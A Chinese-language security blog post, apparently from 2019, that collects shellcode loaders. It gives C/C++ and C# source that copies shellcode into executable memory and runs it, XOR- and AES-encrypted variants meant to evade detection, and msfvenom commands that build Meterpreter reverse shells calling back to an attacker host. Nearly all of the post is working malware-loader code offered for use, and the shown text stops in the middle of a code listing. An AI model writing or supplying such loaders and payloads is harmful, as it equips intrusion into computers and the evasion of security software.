<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title> shellcode加载总结 · Uknow - Stay hungry Stay foolish</title><meta name="description" content="shellcode加载总结 - uknow"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="short icon" href="/2.png"><link rel="stylesheet" href="/css/apollo.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,600" type="text/css"></head><body><div id="mask" style="display: none;"><img id="mask-image" src="#" style=" "></div><div class="wrap"><header><a href="/" class="logo-link"><img src="/2.png"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">Blog</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">Archive</a></li><li class="nav-list-item"><a href="/about" target="_self" class="nav-list-link">About</a></li><li class="nav-list-item"><a href="https://github.com/uknowsec" target="_blank" class="nav-list-link">GitHub</a></li><li class="nav-list-item"><a href="http://weibo.com/uknowsec" target="_blank" class="nav-list-link">Weibo</a></li></ul></header><section class="container"><div class="post"><article class="post-block"><h1 class="post-title">shellcode加载总结</h1><div class="post-time">Aug 1, 2019</div><div class="post-content"><h2><span id="cc">C/C++</span></h2><h3><span id="源码加载">源码加载</span></h3><h4><span id="利用动态申请内存">利用动态申请内存</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">typedef void (_stdcall *CODE)();</span><br><span class="line">#pragma comment(linker,&quot;/subsystem:\&quot;windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;)</span><br><span class="line">unsigned char shellcode[] =&quot;&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    PVOID p = NULL;</span><br><span class="line">    p = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    if (p == NULL)</span><br><span class="line">    &#123;</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    memcpy(p, shellcode, sizeof(shellcode));</span><br><span class="line">    </span><br><span class="line">    CODE code = (CODE)p;</span><br><span class="line">    code();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4><span id="强制类型转换成函数指针">强制类型转换成函数指针</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#pragma comment(linker,&quot;/subsystem:\&quot;windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;)</span><br><span class="line">unsigned char shellcode[] =&quot;&quot;;</span><br><span class="line"></span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">   ((void(WINAPI*)(void))&amp;shellcode)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4><span id="嵌入式汇编呼叫shellcode">嵌入式汇编呼叫shellcode</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#pragma comment(linker, &quot;/section:.data,RWE&quot;)</span><br><span class="line">unsigned char shellcode[] =&quot;&quot;;</span><br><span class="line"></span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">	    __asm</span><br><span class="line">    &#123;</span><br><span class="line">        </span><br><span class="line">        mov eax, offset shellcode</span><br><span class="line">        jmp eax</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4><span id="伪指令">伪指令</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#pragma comment(linker, &quot;/section:.data,RWE&quot;)</span><br><span class="line">unsigned char shellcode[] =&quot;&quot;;</span><br><span class="line"></span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">	    __asm</span><br><span class="line">    &#123;</span><br><span class="line">        </span><br><span class="line">        mov eax, offset shellcode</span><br><span class="line">        _emit 0xFF  </span><br><span class="line">        _emit 0xE0</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4><span id="xor加密">xor加密</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">Author: Arno0x0x, Twitter: @Arno0x0x</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">#include &quot;stdafx.h&quot;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char **argv) &#123;</span><br><span class="line"></span><br><span class="line">	// Encrypted shellcode and cipher key obtained from shellcode_encoder.py</span><br><span class="line">	char encryptedShellcode[] = &quot;&quot;;</span><br><span class="line">	char key[] = &quot;uknowsec&quot;;</span><br><span class="line">	char cipherType[] = &quot;xor&quot;;</span><br><span class="line"></span><br><span class="line">	// Char array to host the deciphered shellcode</span><br><span class="line">	char shellcode[sizeof encryptedShellcode];	</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	// XOR decoding stub using the key defined above must be the same as the encoding key</span><br><span class="line">	int j = 0;</span><br><span class="line">	for (int i = 0; i &lt; sizeof encryptedShellcode; i++) &#123;</span><br><span class="line">		if (j == sizeof key - 1) j = 0;</span><br><span class="line"></span><br><span class="line">		shellcode[i] = encryptedShellcode[i] ^ key[j];</span><br><span class="line">		j++;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	// Allocating memory with EXECUTE writes</span><br><span class="line">	void *exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">	// Copying deciphered shellcode into memory as a function</span><br><span class="line">	memcpy(exec, shellcode, sizeof shellcode);</span><br><span class="line"></span><br><span class="line">	// Call the shellcode</span><br><span class="line">	((void(*)())exec)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/shellcode_2.png" alt=""></p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/shellcode_4.png" alt=""></p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/shellcode_5.png" alt=""></p>
<h3><span id="加载器">加载器</span></h3><h4><span id="c加载shellcode方式的payload到内存">C++.加载shellcode方式的payload到内存</span></h4><p><a href="https://github.com/clinicallyinane/shellcode_launcher/" target="_blank" rel="noopener">https://github.com/clinicallyinane/shellcode_launcher/</a> </p>
<p>生成shellcode</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=ip lport=port -e x86/shikata_ga_nai -i 5 -f raw &gt; test.c</span><br></pre></td></tr></table></figure>
<p>shellcode 加载<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shellcode_launcher.exe -i test.c</span><br></pre></td></tr></table></figure></p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/shellcode_6.png" alt=""></p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/shellcode_7.png" alt=""></p>
<h4><span id="c以十六进制的方式执行shellcode">C以十六进制的方式执行shellcode</span></h4><p><a href="https://github.com/DimopoulosElias/SimpleShellcodeInjector" target="_blank" rel="noopener">https://github.com/DimopoulosElias/SimpleShellcodeInjector</a></p>
<p>生成shellcode<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_https LHOST=1.2.3.4 LPORT=443 -f c -o msf.txt</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat msf.txt|grep -v unsigned|sed &quot;s/\&quot;\\\x//g&quot;|sed &quot;s/\\\x//g&quot;|sed &quot;s/\&quot;//g&quot;|sed &apos;:a;N;$!ba;s/\n//g&apos;|sed &quot;s/;//g&quot;</span><br></pre></td></tr></table></figure>
<p>加载shellcode</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssi.exe shellcode</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/shellcode_8.png" alt=""></p>
<h2><span id="csharp">Csharp</span></h2><h3><span id="源码加载">源码加载</span></h3><h4><span id="直接加载">直接加载</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">using System;</span><br><span class="line">using System.Runtime.InteropServices;</span><br><span class="line">namespace TCPMeterpreterProcess</span><br><span class="line">&#123;</span><br><span class="line">    class Program</span><br><span class="line">    &#123;</span><br><span class="line">        static void Main(string[] args)</span><br><span class="line">        &#123;</span><br><span class="line">            // native function’s compiled code</span><br><span class="line">            // generated with metasploit</span><br><span class="line">            byte[] shellcode = new byte[333] &#123;</span><br><span class="line">            </span><br><span class="line">            &#125;;</span><br><span class="line">            UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,</span><br><span class="line">            MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">            Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);</span><br><span class="line">            IntPtr hThread = IntPtr.Zero;</span><br><span class="line">            UInt32 threadId = 0;</span><br><span class="line">            // prepare data</span><br><span class="line">            IntPtr pinfo = IntPtr.Zero;</span><br><span class="line">            // execute native code</span><br><span class="line">            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);</span><br><span class="line">            WaitForSingleObject(hThread, 0xFFFFFFFF);</span><br><span class="line">            &#125;</span><br><span class="line">                    private static UInt32 MEM_COMMIT = 0x1000;</span><br><span class="line">            private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;</span><br><span class="line">            [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">                    private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,</span><br><span class="line">            UInt32 size, UInt32 flAllocationType, UInt32 flProtect);</span><br><span class="line">            [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">                    private static extern bool VirtualFree(IntPtr lpAddress,</span><br><span class="line">            UInt32 dwSize, UInt32 dwFreeType);</span><br><span class="line">            [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">                    private static extern IntPtr CreateThread(</span><br><span class="line">            UInt32 lpThreadAttributes,</span><br><span class="line">            UInt32 dwStackSize,</span><br><span class="line">            UInt32 lpStartAddress,</span><br><span class="line">            IntPtr param,</span><br><span class="line">            UInt32 dwCreationFlags,</span><br><span class="line">            ref UInt32 lpThreadId</span><br><span class="line">            );</span><br><span class="line">            [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">                    private static extern bool CloseHandle(IntPtr handle);</span><br><span class="line">            [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">                    private static extern UInt32 WaitForSingleObject(</span><br><span class="line">            IntPtr hHandle,</span><br><span class="line">            UInt32 dwMilliseconds</span><br><span class="line">            );</span><br><span class="line">            [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">                    private static extern IntPtr GetModuleHandle(</span><br><span class="line">            string moduleName</span><br><span class="line">            );</span><br><span class="line">            [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">                    private static extern UInt32 GetProcAddress(</span><br><span class="line">            IntPtr hModule,</span><br><span class="line">            string procName</span><br><span class="line">            );</span><br><span class="line">            [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">                    private static extern UInt32 LoadLibrary(</span><br><span class="line">            string lpFileName</span><br><span class="line">            );</span><br><span class="line">            [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">                    private static extern UInt32 GetLastError();</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Threading;</span><br><span class="line">using System.Runtime.InteropServices;</span><br><span class="line">namespace MSFWrapper</span><br><span class="line">&#123;</span><br><span class="line">    public class Program</span><br><span class="line">    &#123;</span><br><span class="line">        public Program()</span><br><span class="line">        &#123;</span><br><span class="line">           RunMSF();</span><br><span class="line">        &#125;</span><br><span class="line">        public static void RunMSF()</span><br><span class="line">        &#123;</span><br><span class="line">            byte[] MsfPayload = &#123;</span><br><span class="line">            //Paste your Payload here</span><br><span class="line">        &#125;;</span><br><span class="line">            IntPtr returnAddr = VirtualAlloc((IntPtr)0, (uint)Math.Max(MsfPayload.Length, 0x1000), 0x3000, 0x40);</span><br><span class="line">            Marshal.Copy(MsfPayload, 0, returnAddr, MsfPayload.Length);</span><br><span class="line">            CreateThread((IntPtr)0, 0, returnAddr, (IntPtr)0, 0, (IntPtr)0);</span><br><span class="line">            Thread.Sleep(2000);</span><br><span class="line">        &#125;</span><br><span class="line">        public static void Main()</span><br><span class="line">        &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        [DllImport(&quot;kernel32.dll&quot;)]</span><br><span class="line">        public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);</span><br><span class="line">        [DllImport(&quot;kernel32.dll&quot;)]</span><br><span class="line">        public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>保存代码后，修改该工程的属性，将输出类型改为“Windows 应用程序”，启动对象改为“MSFWrapper.Program”并保存。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/shellcode_1.png" alt=""></p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/shellcode_3.png" alt=""></p>
<h4><span id="aes加密">aes加密</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">Author: Arno0x0x, Twitter: @Arno0x0x</span><br><span class="line"></span><br><span class="line">How to compile:</span><br><span class="line">===============</span><br><span class="line">C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:encryptedShellcodeWrapper_aes.exe encryptedShellcodeWrapper_aes.cs</span><br><span class="line"></span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">using System;</span><br><span class="line">using System.IO;</span><br><span class="line">using System.Collections.Generic;</span><br><span class="line">using System.Text;</span><br><span class="line">using System.Threading.Tasks;</span><br><span class="line">using System.Security.Cryptography;</span><br><span class="line">using System.Runtime.InteropServices;</span><br><span class="line"></span><br><span class="line">namespace RunShellCode</span><br><span class="line">&#123;</span><br><span class="line">    static class Program</span><br><span class="line">    &#123;</span><br><span class="line">        //==============================================================================</span><br><span class="line">        // CRYPTO FUNCTIONS</span><br><span class="line">        //==============================================================================</span><br><span class="line">        private static T[] SubArray&lt;T&gt;(this T[] data, int index, int length)</span><br><span class="line">        &#123;</span><br><span class="line">            T[] result = new T[length];</span><br><span class="line">            Array.Copy(data, index, result, 0, length);</span><br><span class="line">            return result;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        private static byte[] xor(byte[] cipher, byte[] key) &#123;</span><br><span class="line">            byte[] decrypted = new byte[cipher.Length];</span><br><span class="line"></span><br><span class="line">            for(int i = 0; i &lt; cipher.Length; i++) &#123;</span><br><span class="line">                decrypted[i] = (byte) (cipher[i] ^ key[i % key.Length]);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            return decrypted;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        //--------------------------------------------------------------------------------------------------</span><br><span class="line">        // Decrypts the given a plaintext message byte array with a given 128 bits key</span><br><span class="line">        // Returns the unencrypted message</span><br><span class="line">        //--------------------------------------------------------------------------------------------------</span><br><span class="line">        private static byte[] aesDecrypt(byte[] cipher, byte[] key)</span><br><span class="line">        &#123;</span><br><span class="line">            var IV = cipher.SubArray(0, 16);</span><br><span class="line">            var encryptedMessage = cipher.SubArray(16, cipher.Length - 16);</span><br><span class="line"></span><br><span class="line">            // Create an AesManaged object with the specified key and IV.</span><br><span class="line">            using (AesManaged aes = new AesManaged())</span><br><span class="line">            &#123;</span><br><span class="line">                aes.Padding = PaddingMode.PKCS7;</span><br><span class="line">                aes.KeySize = 128;</span><br><span class="line">                aes.Key = key;</span><br><span class="line">                aes.IV = IV;</span><br><span class="line"></span><br><span class="line">                using (MemoryStream ms = new MemoryStream())</span><br><span class="line">                &#123;</span><br><span class="line">                    using (CryptoStream cs = new CryptoStream(ms, aes.CreateDecryptor(), CryptoStreamMode.Write))</span><br><span class="line">                    &#123;</span><br><span class="line">                        cs.Write(encryptedMessage, 0, encryptedMessage.Length);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    return ms.ToArray();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        //==============================================================================</span><br><span class="line">        // MAIN FUNCTION</span><br><span class="line">        //==============================================================================</span><br><span class="line">        static void Main()</span><br><span class="line">        &#123;</span><br><span class="line">            byte[] encryptedShellcode = new byte[] &#123; &#125;;</span><br><span class="line">            string key = &quot;Nv78rga+vzeTO+acx4EXCw==&quot;;</span><br><span class="line">            string cipherType = &quot;aes&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            byte[] shellcode = null;</span><br><span class="line"></span><br><span class="line">            //--------------------------------------------------------------</span><br><span class="line">            // Decrypt the shellcode</span><br><span class="line">            if (cipherType == &quot;xor&quot;) &#123;</span><br><span class="line">                shellcode = xor(encryptedShellcode, Encoding.ASCII.GetBytes(key));</span><br><span class="line">            &#125;</span><br><span class="line">            else if (cipherType == &quot;aes&quot;) &#123;</span><br><span class="line">                shellcode = aesDecrypt(encryptedShellcode, Convert.FromBase64String(key));</span><br><span class="line">            &#125;</span><br><span class="line">                        </span><br><span class="line">            //--------------------------------------------------------------        	</span><br><span class="line">            // Copy decrypted shellcode to memory</span><br><span class="line">            UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">            Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);</span><br><span class="line">            IntPtr hThread = IntPtr.Zero;</span><br><span class="line">            UInt32 threadId = 0;</span><br><span class="line"></span><br><span class="line">            // Prepare data</span><br><span class="line">            IntPtr pinfo = IntPtr.Zero;</span><br><span class="line"></span><br><span class="line">            // Invoke the shellcode</span><br><span class="line">            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);</span><br><span class="line">            WaitForSingleObject(hThread, 0xFFFFFFFF);</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        private static UInt32 MEM_COMMIT = 0x1000;</span><br><span class="line">        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;</span><br><span class="line"></span><br><span class="line">        // The usual Win32 API trio functions: VirtualAlloc, CreateThread, WaitForSingleObject</span><br><span class="line">        [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">        private static extern UInt32 VirtualAlloc(</span><br><span class="line">            UInt32 lpStartAddr,</span><br><span class="line">            UInt32 size,</span><br><span class="line">            UInt32 flAllocationType,</span><br><span class="line">            UInt32 flProtect</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">        private static extern IntPtr CreateThread(</span><br><span class="line">            UInt32 lpThreadAttributes,</span><br><span class="line">            UInt32 dwStackSize,</span><br><span class="line">            UInt32 lpStartAddress,</span><br><span class="line">            IntPtr param,</span><br><span class="line">            UInt32 dwCreationFlags,</span><br><span class="line">            ref UInt32 lpThreadId</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        [DllImport(&quot;kernel32&quot;)]</span><br><span class="line">        private static extern UInt32 WaitForSingleObject(</span><br><span class="line">            IntPtr hHandle,</span><br><span class="line">            UInt32 dwMilliseconds</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4><span id="xor加密">xor加密</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span 